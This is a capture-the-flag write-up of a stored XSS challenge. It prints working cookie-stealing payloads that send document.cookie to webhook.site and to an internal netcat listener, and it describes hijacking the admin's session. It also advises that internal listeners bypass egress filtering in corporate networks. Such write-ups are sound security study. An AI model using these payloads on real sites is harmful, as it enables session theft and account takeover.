# XSS cookie theft, but only over an internal listener

A blog-style app that rendered submitted messages and bragged that the admin reads them once a minute in a "full-fledged web browser". Classic stored-XSS bait.

Posting a `<script>alert(...)</script>` worked: my own browser fired it back when I viewed the message. Below the post it even said the admin would visit it. So far so good.

## What didn't work

Cookie exfiltration to `webhook.site` over HTTPS:

```html
<script>fetch("https://webhook.site/<id>?c=" + document.cookie);</script>
```

My own browser fired it; webhook got my cookie. The admin's headless browser never did. Tried an `<img onerror=...>` version. Same outcome.

A classmate's tip: outbound traffic from the challenge environment might be restricted. Trying to reach external HTTPS endpoints from inside their sandbox probably wouldn't work.

## What worked

Host the listener inside the same network. I had SSH access to the same shell host, so on a high port:

```bash
nc -lvnp 4444
```

Submit:

```html
<img src=x onerror="this.src='http://<internal-host>:4444/?c='+document.cookie">
```

The admin's bot loaded the message a minute later, the `<img>` failed to load, the `onerror` handler fired, and the admin's session cookie came back over my listener as a GET query parameter.

Drop the cookie into my browser, hit `/admin`, flag was there.

> Postmortem: I suspect the HTTPS attempts failed because the admin browser didn't trust an arbitrary external CA, or outbound TLS was firewalled to a specific allowlist. Plain HTTP to an internal IP sailed through.

## Lesson

Cookie exfiltration assumes the victim's browser can reach your listener. In sandboxed CTF environments, and in real corporate networks with egress filtering, that's a non-trivial assumption. Internal listeners on the same network usually bypass the filter.
